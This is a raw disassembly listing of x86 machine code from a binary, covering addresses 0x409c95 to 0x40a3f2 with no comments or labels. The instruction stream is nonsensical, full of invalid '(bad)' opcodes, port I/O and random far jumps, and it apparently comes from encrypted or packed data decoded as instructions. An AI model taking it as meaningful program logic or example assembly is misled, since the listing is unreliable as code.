  409c95:	jns    0x409c34
  409c97:	jl     0x409ce4
  409c99:	ret    0xb218
  409c9c:	cmp    al,0x83
  409c9e:	inc    ebp
  409c9f:	sub    DWORD PTR [edx],0xffffff99
  409ca2:	fsubr  QWORD PTR [edi-0x2c55b014]
  409ca8:	js     0x409cae
  409caa:	and    al,0x48
  409cac:	(bad)  
  409cad:	pop    edx
  409cae:	jl     0x409c3d
  409cb0:	sub    DWORD PTR [ebx],esp
  409cb2:	lock fcmovbe st,st(7)
  409cb5:	inc    BYTE PTR [ecx-0x6cfc4aa0]
  409cbb:	das    
  409cbc:	or     dl,BYTE PTR [ebp-0x5e]
  409cbf:	sbb    eax,0x9fab6206
  409cc4:	jmp    0xa319eee3
  409cc9:	leave  
  409cca:	ror    DWORD PTR [edx-0x9e27410],1
  409cd0:	popa   
  409cd1:	sbb    bl,cl
  409cd3:	nop
  409cd4:	pop    es
  409cd5:	pop    edi
  409cd6:	pop    esp
  409cd7:	xor    eax,0x840420f
  409cdc:	mov    eax,0x759c2ba
  409ce1:	mov    cl,0x82
  409ce3:	(bad)  
  409ce4:	ds fnstsw ax
  409ce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ce8:	or     eax,0xe6484b58
  409ced:	jg     0x409c7a
  409cef:	ins    BYTE PTR es:[edi],dx
  409cf0:	cld    
  409cf1:	jp     0x409c97
  409cf3:	pop    esp
  409cf4:	and    dl,ch
  409cf6:	lea    ebx,[ecx-0x33]
  409cf9:	dec    ebx
  409cfa:	div    DWORD PTR [eax-0xb]
  409cfd:	fnsave [edi-0x57]
  409d00:	lahf   
  409d01:	gs push ss
  409d03:	and    ebp,DWORD PTR [ebx-0x52]
  409d06:	sti    
  409d07:	inc    esp
  409d08:	inc    edi
  409d09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d0a:	jmp    0x6247:0xac42ba3d
  409d11:	xchg   esp,eax
  409d12:	mov    ch,0xf1
  409d14:	pcmpgtd mm3,QWORD PTR [ebp-0x5ec76ba1]
  409d1b:	sub    BYTE PTR [esi-0x39],bl
  409d1e:	pop    esp
  409d1f:	jmp    0xab87:0x4627b26a
  409d26:	push   ebp
  409d27:	push   ecx
  409d28:	jl     0x409cfa
  409d2a:	call   0xabd4faad
  409d2f:	fadd   DWORD PTR [edx+edx*8]
  409d32:	push   0x58edc995
  409d37:	inc    edx
  409d38:	out    dx,eax
  409d39:	mov    dh,BYTE PTR [ebp-0x64]
  409d3c:	sub    al,0x3d
  409d3e:	mov    edi,0x28134bd6
  409d43:	push   ebx
  409d44:	stos   DWORD PTR es:[edi],eax
  409d45:	pop    ebp
  409d46:	or     dl,BYTE PTR [ebx-0x55]
  409d49:	fidivr DWORD PTR [eax+0x79]
  409d4c:	sbb    al,0x5c
  409d4e:	push   es
  409d4f:	cmp    eax,0x23c30bea
  409d54:	xchg   esp,eax
  409d55:	icebp  
  409d56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d57:	movhlps xmm1,xmm1
  409d5a:	cmp    esp,DWORD PTR [esi+0x7953e2cc]
  409d60:	es xor bh,ah
  409d63:	or     DWORD PTR [ecx-0x23],esp
  409d66:	jnp    0x409dc6
  409d68:	xor    eax,0xadac06f3
  409d6d:	mov    esi,0x6a9ed94c
  409d72:	jno    0x409d82
  409d74:	ins    BYTE PTR es:[edi],dx
  409d75:	pop    ss
  409d76:	push   ebp
  409d77:	div    ebp
  409d79:	mov    ebx,ebp
  409d7b:	or     dl,cl
  409d7d:	shl    bh,cl
  409d7f:	and    bh,BYTE PTR [esp+ebx*1]
  409d82:	pop    edi
  409d83:	scas   al,BYTE PTR es:[edi]
  409d84:	xchg   ebx,eax
  409d85:	jb     0x409d4e
  409d87:	dec    ebx
  409d88:	lahf   
  409d89:	imul   ebp,ecx,0x54e9e79b
  409d8f:	xor    eax,ecx
  409d91:	cmp    BYTE PTR ds:0xcd5c063a,dl
  409d97:	cwde   
  409d98:	jnp    0x409d75
  409d9a:	mov    ch,0x21
  409d9c:	inc    ebp
  409d9d:	push   es
  409d9e:	add    eax,0x39c6ca3a
  409da3:	push   cs
  409da4:	(bad)
  409da7:	arpl   WORD PTR [ecx+0x3ae091d7],si
  409dad:	cs ret 
  409daf:	push   edx
  409db0:	and    ebp,DWORD PTR [edx+0x68]
  409db3:	sub    al,0xcf
  409db5:	inc    ecx
  409db6:	leave  
  409db7:	mov    dh,0x34
  409db9:	shl    BYTE PTR [esi+0x1faa339f],1
  409dbf:	dec    eax
  409dc0:	pop    esi
  409dc1:	adc    BYTE PTR [edx],cl
  409dc3:	jle    0x409d46
  409dc5:	push   cs
  409dc6:	jmp    0x409dc1
  409dc8:	xchg   esp,eax
  409dc9:	cwde   
  409dca:	mov    ebp,0x24188a0a
  409dcf:	sbb    DWORD PTR [ecx],esp
  409dd1:	(bad)  
  409dd2:	mov    ebx,0xb1b08e5d
  409dd7:	cwde   
  409dd8:	xchg   dl,bl
  409dda:	push   edi
  409ddb:	lahf   
  409ddc:	outs   dx,BYTE PTR ds:[esi]
  409ddd:	lea    esi,[eax]
  409ddf:	or     eax,0x93e6c33b
  409de4:	push   ebx
  409de5:	sub    al,0xde
  409de7:	sti    
  409de8:	xchg   ebx,eax
  409de9:	fisubr WORD PTR [ebx+0x10]
  409dec:	neg    bh
  409dee:	or     ebx,DWORD PTR ds:0x5491ab6c
  409df4:	not    BYTE PTR [esi+0x30]
  409df7:	test   BYTE PTR [ecx-0xd59f996],al
  409dfd:	dec    ecx
  409dfe:	adc    BYTE PTR [edx-0x44],bl
  409e01:	adc    al,0x4f
  409e03:	outs   dx,DWORD PTR ds:[esi]
  409e04:	nop
  409e05:	les    edx,FWORD PTR [esi+0x5f64e3ad]
  409e0b:	xor    dh,BYTE PTR ds:0xef2a9f7f
  409e11:	lock sub eax,0x5992e44c
  409e17:	push   esi
  409e18:	test   al,0x7
  409e1a:	sbb    esp,eax
  409e1c:	imul   ebp,DWORD PTR [ebx-0x37768c94],0x57
  409e23:	pop    eax
  409e24:	popa   
  409e25:	pushf  
  409e26:	fsub   st,st(6)
  409e28:	push   esi
  409e29:	push   ds
  409e2a:	dec    esi
  409e2b:	mov    ebx,0xacc8dae9
  409e30:	add    edi,DWORD PTR ss:[ecx+0x3f298596]
  409e37:	in     al,0xcd
  409e39:	add    BYTE PTR [esp+ecx*2+0x28f4070],bl
  409e40:	hlt    
  409e41:	(bad)  
  409e42:	fnstcw WORD PTR [eax-0x24]
  409e45:	xchg   esp,eax
  409e46:	xchg   ecx,edi
  409e48:	in     al,0x53
  409e4a:	xor    eax,ebx
  409e4c:	push   0x6fbed7c2
  409e51:	cmc    
  409e52:	out    dx,al
  409e53:	lods   eax,DWORD PTR ds:[esi]
  409e54:	mov    bh,bl
  409e56:	adc    DWORD PTR [eax+edx*1-0x1cfeee2b],edx
  409e5d:	shl    DWORD PTR [edi-0x4d2bc9bf],0xd6
  409e64:	sbb    BYTE PTR [edx+0x5371ad89],bh
  409e6a:	inc    edx
  409e6b:	cmc    
  409e6c:	jne    0x409e74
  409e6e:	push   ecx
  409e6f:	xchg   edx,eax
  409e70:	pop    ebx
  409e71:	call   0x4016:0x5492e4eb
  409e78:	jp     0x409e4d
  409e7a:	popa   
  409e7b:	jb     0x409eef
  409e7d:	xchg   edx,eax
  409e7e:	outs   dx,DWORD PTR ds:[esi]
  409e7f:	ret    0x8313
  409e82:	int3   
  409e83:	or     al,0x1a
  409e85:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e87:	jecxz  0x409ee0
  409e89:	inc    ecx
  409e8a:	neg    BYTE PTR [ecx+ebp*2]
  409e8d:	nop
  409e8e:	in     eax,0x6c
  409e90:	mov    esi,DWORD PTR [esi]
  409e92:	xor    esi,0xf44a8bc5
  409e98:	xor    edi,DWORD PTR [edi-0x20ed5485]
  409e9e:	lahf   
  409e9f:	jmp    0x409eac
  409ea1:	nop
  409ea2:	sub    DWORD PTR [ebx],ebx
  409ea4:	mov    ds:0x143fb40,al
  409ea9:	pop    edi
  409eaa:	xchg   esi,eax
  409eab:	jbe    0x409ed6
  409ead:	mov    eax,ebx
  409eaf:	fnstsw WORD PTR [ecx]
  409eb1:	gs out dx,eax
  409eb3:	jmp    0x7386:0x8d0d252b
  409eba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ebb:	adc    BYTE PTR [ebx],bh
  409ebd:	add    cl,BYTE PTR [ecx]
  409ebf:	fistp  WORD PTR [esi+0x52]
  409ec2:	push   esi
  409ec3:	inc    ebp
  409ec4:	lods   eax,DWORD PTR ss:[esi]
  409ec6:	sub    ebp,0xffffffab
  409ec9:	inc    esi
  409eca:	and    al,0x75
  409ecd:	jl     0x409e92
  409ecf:	add    esp,DWORD PTR [edx]
  409ed1:	cdq    
  409ed2:	pop    esi
  409ed3:	mov    dh,0x17
  409ed5:	int3   
  409ed6:	lock sti 
  409ed8:	aas    
  409ed9:	jo     0x409ee1
  409edb:	(bad)  
  409edc:	leave  
  409edd:	aam    0x15
  409edf:	sbb    BYTE PTR [esi],al
  409ee1:	cdq    
  409ee2:	mov    ch,0x2e
  409ee4:	inc    ecx
  409ee5:	in     eax,dx
  409ee6:	jmp    DWORD PTR [ebp-0x5d]
  409ee9:	in     al,dx
  409eea:	jne    0x409e7f
  409eec:	push   esp
  409eed:	dec    eax
  409eee:	mov    al,ds:0x8a1db0c2
  409ef3:	(bad)  
  409ef4:	pusha  
  409ef5:	inc    esi
  409ef6:	aam    0x2c
  409ef8:	or     cl,BYTE PTR [eax-0x62]
  409efb:	pop    esp
  409efc:	out    0x9b,eax
  409efe:	sub    dl,bl
  409f00:	(bad)  
  409f01:	mov    eax,0xf4915f8
  409f06:	rol    BYTE PTR [esp+ebp*8+0x16d50f2f],0xc2
  409f0e:	imul   ebx,DWORD PTR [edx-0xb],0xffffffd3
  409f12:	bound  edx,QWORD PTR [ebx-0x401132de]
  409f18:	jle    0x9ebd9c0d
  409f1e:	push   edx
  409f1f:	jmp    0x409f6f
  409f21:	fs jnp 0x409f2d
  409f24:	fcom   DWORD PTR [edx]
  409f26:	xor    DWORD PTR [ecx+0x636ac994],edi
  409f2c:	pop    edx
  409f2d:	fwait
  409f2e:	gs out 0xeb,al
  409f31:	add    DWORD PTR [ebp+0x43953b8],ebp
  409f37:	jo     0x409f34
  409f39:	pop    eax
  409f3a:	pop    ds
  409f3b:	or     BYTE PTR [ecx],0x30
  409f3e:	in     eax,0xa5
  409f40:	fild   WORD PTR [ecx]
  409f42:	aas    
  409f43:	inc    ecx
  409f44:	adc    ecx,DWORD PTR [ebp+0x3f3112b6]
  409f4a:	pop    esp
  409f4b:	inc    ecx
  409f4c:	addr16 aam 0xf0
  409f4f:	add    BYTE PTR [edx],0xe5
  409f52:	xor    eax,0x39e9afe
  409f57:	adc    al,0x6b
  409f59:	icebp  
  409f5a:	fwait
  409f5b:	popa   
  409f5c:	sbb    ah,bh
  409f5e:	push   ebx
  409f5f:	sub    ch,BYTE PTR [ebp-0x76]
  409f62:	inc    edx
  409f63:	cld    
  409f64:	sbb    DWORD PTR [edi],0xffffffc5
  409f67:	xor    dl,dh
  409f69:	pop    es
  409f6a:	mov    ebx,0x84b52d51
  409f6f:	push   esi
  409f70:	push   ds
  409f71:	ror    BYTE PTR [eax+0x149d88b9],1
  409f77:	jns    0x409f7a
  409f79:	mov    ah,0xb9
  409f7b:	stc    
  409f7c:	imul   ecx,esi,0x50
  409f7f:	test   BYTE PTR [edx],0xc5
  409f82:	ss sbb eax,0x4e82fcf5
  409f88:	ins    DWORD PTR es:[edi],dx
  409f89:	cmp    ah,BYTE PTR [ecx-0x7e]
  409f8c:	mov    ds:0x2887c719,eax
  409f91:	das    
  409f92:	jle    0x409fbb
  409f94:	pop    esi
  409f95:	lock jle 0x409f52
  409f98:	mov    ah,0x6
  409f9a:	inc    esp
  409f9b:	sti    
  409f9c:	arpl   WORD PTR [ebx-0x6fd18cdc],ax
  409fa2:	lock push 0xffffffd2
  409fa5:	xchg   dx,ax
  409fa7:	mov    BYTE PTR [ebx-0x4cf8546b],al
  409fad:	add    ebx,edx
  409faf:	mov    ds:0x6c7b92aa,al
  409fb4:	sbb    DWORD PTR [ecx],0xffffff89
  409fb7:	cmp    al,0x83
  409fb9:	xchg   esi,eax
  409fba:	lds    ecx,FWORD PTR [ecx+0xa7845c9]
  409fc0:	and    eax,0xbd37b9b3
  409fc5:	mov    ds:0x2854e9a8,eax
  409fca:	fistp  QWORD PTR [edi-0x74]
  409fcd:	in     al,dx
  409fce:	or     bl,BYTE PTR [esi+ebp*2]
  409fd1:	add    al,0xff
  409fd3:	mov    ebx,0xcb2e8778
  409fd8:	out    0x96,eax
  409fda:	mov    edx,0xa289c651
  409fdf:	mov    esp,0xddde1f39
  409fe4:	xchg   ebp,eax
  409fe5:	xchg   edx,eax
  409fe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fe7:	add    BYTE PTR [edx-0x46],ch
  409fea:	push   esp
  409feb:	aas    
  409fec:	dec    ecx
  409fed:	test   BYTE PTR [eax],bh
  409fef:	adc    esp,DWORD PTR [eax-0x5d]
  409ff2:	mov    dh,0x10
  409ff4:	mov    DWORD PTR [edi],ecx
  409ff6:	xchg   ebp,eax
  409ff7:	cmp    eax,0x13469a15
  409ffc:	xchg   DWORD PTR [ecx-0x1921c23e],eax
  40a002:	adc    ecx,DWORD PTR [edi+0x5d]
  40a005:	xchg   edx,eax
  40a006:	mul    BYTE PTR [edx]
  40a008:	or     bl,BYTE PTR ds:0x4caf4c10
  40a00e:	mov    cl,0x46
  40a010:	push   cs
  40a011:	mov    eax,0x7b55c19e
  40a016:	in     al,dx
  40a017:	pop    ebp
  40a018:	ret    
  40a019:	pop    ebp
  40a01a:	pop    es
  40a01b:	mov    WORD PTR [esi+0x48],?
  40a01e:	push   ebp
  40a01f:	int3   
  40a020:	sub    BYTE PTR [eax-0x40f1d690],bh
  40a026:	fnstcw WORD PTR ss:0x18acd00e
  40a02d:	out    0xe3,al
  40a02f:	jge    0x409fb3
  40a031:	(bad)  
  40a032:	lods   al,BYTE PTR ds:[esi]
  40a033:	mov    cl,0xe3
  40a035:	or     BYTE PTR [edi+edi*8],dl
  40a038:	loope  0x409fe2
  40a03a:	and    DWORD PTR [edi],eax
  40a03c:	mov    ebx,0x52f95825
  40a041:	inc    ebx
  40a042:	sbb    eax,0x85552435
  40a047:	sahf   
  40a048:	enter  0xeb3f,0xa7
  40a04c:	pusha  
  40a04d:	mov    cl,0x79
  40a04f:	sub    bl,BYTE PTR [ebp+0xd]
  40a052:	int3   
  40a053:	and    al,0x49
  40a055:	jo     0x40a030
  40a057:	icebp  
  40a058:	lods   al,BYTE PTR ds:[esi]
  40a059:	inc    ebp
  40a05a:	or     DWORD PTR [ebx],0x8dbee626
  40a060:	(bad)  
  40a061:	push   cs
  40a062:	add    DWORD PTR [edi-0x6f],0x23
  40a066:	xchg   ecx,eax
  40a067:	ins    BYTE PTR es:[edi],dx
  40a068:	mov    esp,0xd3526bd8
  40a06d:	fwait
  40a06e:	xchg   ebp,eax
  40a06f:	or     eax,0x8bfb13be
  40a074:	dec    edi
  40a075:	jge    0x40a050
  40a077:	ja     0x40a0ac
  40a079:	dec    ebx
  40a07a:	add    al,0x46
  40a07c:	jg     0x40a07f
  40a07e:	retf   0xffac
  40a081:	ret    
  40a082:	repnz inc edx
  40a084:	popa   
  40a085:	outs   dx,DWORD PTR ds:[esi]
  40a086:	adc    DWORD PTR [esi],edi
  40a088:	sbb    al,0xd3
  40a08a:	cwde   
  40a08b:	inc    ebp
  40a08c:	inc    esi
  40a08d:	sbb    BYTE PTR [edx],dh
  40a08f:	inc    ebp
  40a090:	fwait
  40a091:	adc    eax,0xdb438db6
  40a096:	dec    eax
  40a097:	pop    esp
  40a098:	sbb    BYTE PTR [edi-0x2232b82c],ah
  40a09e:	mov    cl,0x39
  40a0a0:	shl    BYTE PTR fs:[edi+0x28],0xe3
  40a0a5:	inc    ebp
  40a0a6:	cmp    eax,0x4f8ae85f
  40a0ab:	xchg   BYTE PTR [ebp+0x78],al
  40a0ae:	or     eax,0x99bcc09c
  40a0b3:	and    cl,BYTE PTR [ecx]
  40a0b5:	outs   dx,DWORD PTR ds:[esi]
  40a0b6:	jb     0x40a0a2
  40a0b8:	xor    ebx,DWORD PTR [esi]
  40a0ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0bb:	outs   dx,DWORD PTR ds:[esi]
  40a0bc:	cmp    DWORD PTR [eax],esi
  40a0be:	lods   eax,DWORD PTR ds:[esi]
  40a0bf:	lock les ebx,FWORD PTR [ebp-0x317205b2]
  40a0c6:	sbb    edx,DWORD PTR [eax]
  40a0c8:	mov    ds:0xb429c94,al
  40a0cd:	(bad)  
  40a0ce:	pop    edx
  40a0cf:	imul   ecx,esp,0x2d68a147
  40a0d5:	lods   eax,DWORD PTR ds:[esi]
  40a0d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0d7:	cmc    
  40a0d8:	jge    0x40a119
  40a0da:	bound  ebp,QWORD PTR ds:0xdc01a064
  40a0e0:	lds    ebx,FWORD PTR [ecx+0xcd0304d]
  40a0e6:	lds    edi,FWORD PTR [esi+ebp*2]
  40a0e9:	cmp    al,0xb4
  40a0eb:	div    dl
  40a0ed:	adc    ebx,DWORD PTR [ebx-0x80]
  40a0f0:	lods   eax,DWORD PTR ds:[esi]
  40a0f1:	or     DWORD PTR [edi+0xb2131ac],edi
  40a0f7:	data16 int3 
  40a0f9:	pop    ebx
  40a0fa:	lods   al,BYTE PTR ds:[esi]
  40a0fb:	xor    esp,0xffffffff
  40a0fe:	jl     0x40a0bb
  40a100:	test   BYTE PTR [edi],ah
  40a102:	jno    0x40a15a
  40a104:	pop    esp
  40a105:	mov    al,ds:0xb79f6d71
  40a10a:	lea    eax,[edx+ebp*8]
  40a10d:	fild   DWORD PTR [eax]
  40a10f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a110:	ret    
  40a111:	test   BYTE PTR [eax+0x35],dl
  40a114:	add    ebp,ebp
  40a116:	mov    dh,0xf4
  40a118:	aam    0x88
  40a11a:	pop    DWORD PTR [edx-0x61]
  40a11d:	mov    al,0x2b
  40a11f:	inc    edi
  40a120:	and    al,0xdc
  40a122:	jge    0x40a17c
  40a124:	push   esi
  40a125:	jmp    0x3a14aebf
  40a12a:	cdq    
  40a12b:	jle    0x40a15c
  40a12d:	leave  
  40a12e:	(bad)
  40a131:	or     DWORD PTR [edi+0x4d],edx
  40a134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a135:	or     eax,0x78909e45
  40a13a:	xor    DWORD PTR [ebp-0x33],edi
  40a13d:	lods   eax,DWORD PTR ds:[esi]
  40a13f:	pop    ebx
  40a140:	mov    edi,0x63ee27c7
  40a145:	pop    ebp
  40a146:	bound  ecx,QWORD PTR [ebp+0x2c]
  40a149:	cmp    ebp,DWORD PTR [eax+0x51]
  40a14c:	push   esp
  40a14d:	jnp    0x40a0e3
  40a14f:	mov    edx,0xd13fe1b6
  40a154:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a155:	mov    esi,0xe02f1541
  40a15a:	dec    ebx
  40a15b:	jno    0x40a0e6
  40a15d:	mov    esi,0x622df058
  40a162:	push   0xc
  40a164:	inc    ecx
  40a165:	fwait
  40a166:	aad    0x69
  40a168:	mov    eax,0x5529c265
  40a16d:	cmp    eax,0x82525d7a
  40a172:	push   cs
  40a173:	imul   eax,DWORD PTR [ecx+eax*4-0x66972287],0xffffffbb
  40a17b:	neg    BYTE PTR [edx+0x1e]
  40a17e:	xchg   ebx,eax
  40a17f:	(bad)  
  40a180:	fmul   QWORD PTR [esi]
  40a182:	(bad)  
  40a183:	daa    
  40a184:	mov    bh,0x3a
  40a186:	out    0x16,al
  40a188:	add    ch,BYTE PTR [ebx]
  40a18a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a18b:	sub    ecx,DWORD PTR [eax]
  40a18d:	cmp    BYTE PTR [eax],ah
  40a18f:	mov    dh,0xad
  40a191:	stos   BYTE PTR es:[edi],al
  40a192:	jbe    0x40a13b
  40a194:	retf   
  40a195:	mov    bl,0x20
  40a197:	adc    DWORD PTR [ecx+0x1a1cbea6],ecx
  40a19d:	mov    eax,ds:0x9a65bfe6
  40a1a2:	mov    al,ds:0x2e09dc76
  40a1a7:	aam    0x9
  40a1a9:	mov    dh,0x9f
  40a1ab:	in     eax,dx
  40a1ac:	mov    dh,0xc0
  40a1ae:	xor    BYTE PTR [eax],dh
  40a1b0:	jnp    0x40a15b
  40a1b2:	add    DWORD PTR [edx+0x2c164849],esp
  40a1b8:	fstp   DWORD PTR [ebx-0x59ba695c]
  40a1be:	pop    ds
  40a1bf:	ins    DWORD PTR es:[edi],dx
  40a1c0:	pop    edi
  40a1c1:	push   ebp
  40a1c2:	in     al,dx
  40a1c3:	cld    
  40a1c4:	or     BYTE PTR [esp+ecx*1-0x231f9aac],al
  40a1cb:	fcmovbe st,st(7)
  40a1cd:	enter  0x1c74,0x8
  40a1d1:	and    BYTE PTR [ecx+eiz*1],bl
  40a1d4:	jmp    0x74b1:0x9f32f8b6
  40a1db:	sub    al,0x45
  40a1dd:	cli    
  40a1de:	dec    esp
  40a1df:	in     eax,dx
  40a1e0:	add    DWORD PTR [ebx],esp
  40a1e2:	mov    esi,DWORD PTR [esi+eiz*2]
  40a1e5:	xor    BYTE PTR [ecx+0x54ce0b71],ah
  40a1eb:	sbb    al,0x28
  40a1ed:	cdq    
  40a1ee:	test   BYTE PTR [ecx+0x411f4cb],ch
  40a1f4:	aaa    
  40a1f5:	aaa    
  40a1f6:	gs cmc 
  40a1f8:	dec    edi
  40a1f9:	mov    esi,0xd33825a3
  40a1fe:	pop    es
  40a1ff:	jmp    0x40a189
  40a201:	and    eax,0x904dfa72
  40a206:	pusha  
  40a207:	or     al,0xd5
  40a209:	inc    esp
  40a20a:	fcmovu st,st(0)
  40a20c:	mov    DWORD PTR [ecx+0x28a9d86d],ebp
  40a212:	(bad)
  40a215:	pop    esi
  40a216:	push   edx
  40a217:	call   0x6405dba
  40a21c:	mov    al,ds:0x16a62f8
  40a221:	jg     0x40a1ab
  40a223:	sar    BYTE PTR [edx-0x4a75721a],0x6e
  40a22a:	test   ebp,ebx
  40a22c:	jp     0x40a236
  40a22e:	lea    ebp,[edi+0x48a0823e]
  40a234:	xor    BYTE PTR [edi],dl
  40a236:	pop    eax
  40a237:	cmp    eax,0xaad68ffd
  40a23c:	inc    ebx
  40a23d:	dec    edx
  40a23e:	dec    edi
  40a23f:	pop    esi
  40a240:	mov    ecx,0xbb0341c9
  40a245:	shl    BYTE PTR [ebp-0x5c],1
  40a248:	jo     0x40a24a
  40a24a:	or     eax,0xeb6c1de8
  40a24f:	in     al,dx
  40a250:	jae    0x40a1fd
  40a252:	inc    edx
  40a253:	test   BYTE PTR [ebx-0x7c4db5f6],dh
  40a259:	lods   al,BYTE PTR ds:[esi]
  40a25a:	es sbb eax,0x42ccbf7e
  40a260:	mov    WORD PTR [edi],?
  40a262:	(bad)  
  40a263:	pop    ebp
  40a264:	pop    edx
  40a265:	test   al,0xac
  40a267:	or     BYTE PTR [ebx],bl
  40a269:	aam    0x35
  40a26b:	sub    DWORD PTR [edx+ecx*1+0x7e],ebp
  40a26f:	sub    eax,0x58d68d92
  40a274:	and    ebp,DWORD PTR [edx+0x59]
  40a277:	repz push edi
  40a279:	dec    ebp
  40a27a:	add    BYTE PTR [eax+0x61],bl
  40a27d:	cmp    BYTE PTR [ebp-0x57],ah
  40a280:	xor    ecx,DWORD PTR [ebp+0x5942ae8a]
  40a286:	mov    cs,WORD PTR [edi+ebp*4]
  40a289:	ins    BYTE PTR es:[edi],dx
  40a28a:	adc    ebp,DWORD PTR [ebp+0x20]
  40a28d:	cli    
  40a28e:	ins    DWORD PTR es:[edi],dx
  40a28f:	sbb    BYTE PTR [ebx-0x3b0b6073],0x4a
  40a296:	mov    ecx,0x9c5ab927
  40a29b:	mov    ?,WORD PTR [edx-0x73]
  40a29e:	fsub   DWORD PTR [ebx-0x63]
  40a2a1:	mov    BYTE PTR [edx+esi*8+0x7702e041],cl
  40a2a8:	pop    eax
  40a2a9:	mov    WORD PTR [edx],fs
  40a2ab:	inc    esi
  40a2ac:	out    dx,al
  40a2ad:	jo     0x40a2fc
  40a2af:	jae    0x40a252
  40a2b1:	jns    0x40a2dc
  40a2b3:	out    dx,eax
  40a2b4:	xor    BYTE PTR [edx+esi*2-0x63815b9],al
  40a2bb:	pop    edi
  40a2bc:	scas   al,BYTE PTR es:[edi]
  40a2bd:	imul   esp,ecx,0x56
  40a2c0:	jno    0x40a28c
  40a2c2:	outs   dx,BYTE PTR ds:[esi]
  40a2c3:	mov    esp,0x71f20a81
  40a2c8:	xchg   esp,eax
  40a2c9:	repnz pusha 
  40a2cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2cc:	sbb    eax,0x1aa09045
  40a2d1:	jb     0x40a2c6
  40a2d3:	jns    0x40a316
  40a2d5:	xchg   ebx,eax
  40a2d6:	test   eax,0xbcbccc5c
  40a2db:	outs   dx,DWORD PTR ds:[esi]
  40a2dc:	and    DWORD PTR [eax],esi
  40a2de:	pop    edx
  40a2df:	test   DWORD PTR [eax],esi
  40a2e1:	js     0x40a2c6
  40a2e3:	sub    eax,0xf56477a5
  40a2e8:	loope  0x40a308
  40a2ea:	lods   al,BYTE PTR ds:[esi]
  40a2eb:	adc    edi,0xffffffbe
  40a2ee:	ret    0x9eb5
  40a2f1:	ds in  eax,0x26
  40a2f4:	pusha  
  40a2f5:	out    dx,eax
  40a2f6:	pusha  
  40a2f7:	std    
  40a2f8:	stos   DWORD PTR es:[edi],eax
  40a2f9:	arpl   cx,sp
  40a2fb:	or     al,0xff
  40a2fd:	fs scas al,BYTE PTR es:[edi]
  40a2ff:	cmp    bh,ah
  40a301:	int3   
  40a302:	fwait
  40a303:	mov    bh,0x22
  40a305:	and    BYTE PTR [edx],0x4b
  40a308:	lods   al,BYTE PTR ds:[esi]
  40a309:	das    
  40a30a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a30b:	fstp   DWORD PTR [edi+ebx*2+0x32]
  40a30f:	dec    ebp
  40a310:	fidivr DWORD PTR [edx]
  40a312:	mov    bh,0x58
  40a314:	fsub   st,st(3)
  40a316:	mul    DWORD PTR [ebx+0x312e404d]
  40a31c:	cdq    
  40a31d:	cmp    ecx,esi
  40a31f:	or     dl,0xcd
  40a322:	mov    ebp,0xea1994c2
  40a327:	mov    al,ds:0x485b52a
  40a32c:	adc    ch,BYTE PTR [esi-0x37]
  40a32f:	dec    eax
  40a330:	ins    BYTE PTR es:[edi],dx
  40a331:	or     DWORD PTR [edi],esi
  40a333:	jge    0x40a394
  40a335:	test   esp,edx
  40a337:	(bad)  
  40a338:	fidivr WORD PTR [edx+0x6e]
  40a33b:	mov    ebp,0x1def0343
  40a340:	mov    dh,0x5
  40a342:	ror    al,cl
  40a344:	mov    ch,BYTE PTR [ebp+0x527c1bdc]
  40a34a:	lods   al,BYTE PTR ds:[esi]
  40a34b:	push   esp
  40a34c:	out    0xbc,eax
  40a34e:	mov    cl,0x83
  40a350:	cdq    
  40a351:	mov    ah,0x1f
  40a353:	jb     0x40a35c
  40a355:	sti    
  40a356:	sub    BYTE PTR [ecx-0x4c66ed4f],al
  40a35c:	push   0x60c0c4d6
  40a361:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a363:	mov    ebp,0xbba49383
  40a368:	jmp    0x40a394
  40a36a:	dec    ebx
  40a36b:	xchg   ebx,eax
  40a36c:	or     eax,0x42be22e4
  40a371:	adc    DWORD PTR [esi-0x10],ecx
  40a374:	(bad)  [edi-0x4d]
  40a377:	dec    ebx
  40a378:	inc    ecx
  40a379:	ja     0x40a346
  40a37b:	sbb    bh,bh
  40a37d:	(bad)  
  40a37f:	inc    edi
  40a380:	adc    DWORD PTR [esi],ebp
  40a382:	aam    0x81
  40a384:	mov    dh,BYTE PTR [ebx-0x68]
  40a387:	cmp    al,0xc0
  40a389:	cmp    BYTE PTR [eax-0x4f],al
  40a38c:	je     0x40a32d
  40a38e:	loop   0x40a3b7
  40a390:	data16 jb 0x40a3f9
  40a393:	in     al,0x16
  40a395:	clc    
  40a396:	mov    bh,0xba
  40a398:	in     eax,dx
  40a399:	sub    ch,0xcf
  40a39c:	lea    eax,[ebx-0x39828391]
  40a3a2:	mov    cl,BYTE PTR [eax+0x49e55706]
  40a3a8:	daa    
  40a3a9:	mov    edi,0xb8b3a000
  40a3ae:	cmp    eax,0x967022f9
  40a3b3:	or     al,0x19
  40a3b5:	jecxz  0x40a41f
  40a3b7:	ror    cl,cl
  40a3b9:	adc    eax,0xe68b3c3
  40a3be:	add    BYTE PTR [esi],cl
  40a3c0:	rcl    DWORD PTR [ebx+0x6448fcf2],0x4e
  40a3c7:	pop    esi
  40a3c8:	arpl   WORD PTR ds:0x3a551916,bx
  40a3ce:	rol    BYTE PTR [esi],1
  40a3d0:	and    eax,0x83dd423
  40a3d5:	and    ebx,DWORD PTR [edi+0x32]
  40a3d8:	inc    ebp
  40a3d9:	cdq    
  40a3da:	(bad)  [bp+0x2a00]
  40a3df:	sub    ebx,DWORD PTR [esi]
  40a3e1:	in     al,dx
  40a3e2:	or     esp,esp
  40a3e4:	mov    esi,0x8fba19b9
  40a3e9:	jmp    0x40a438
  40a3eb:	pop    es
  40a3ec:	or     DWORD PTR ds:0x15558fb7,ebp
  40a3f2:	pop    es
